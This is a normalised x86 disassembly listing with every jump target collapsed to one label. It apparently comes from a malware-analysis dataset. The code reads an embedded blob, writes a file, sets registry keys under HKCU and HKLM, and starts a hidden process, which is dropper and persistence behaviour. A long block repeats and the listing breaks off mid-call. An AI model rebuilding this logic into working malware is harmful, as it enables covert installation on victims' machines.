mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_51d080
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_51ce90
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_51ce90
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_51ce90
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_51ce90
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
push 0x37b18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_51cfc0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0x37b18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_51c27d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_51ce90
add esp 0x4
call sub_51d050
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_51d080
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_51d080
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_51ce90
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_51ce90
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_51ce90
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_51ce90
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
push 0x37b18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_51cfc0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0x37b18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
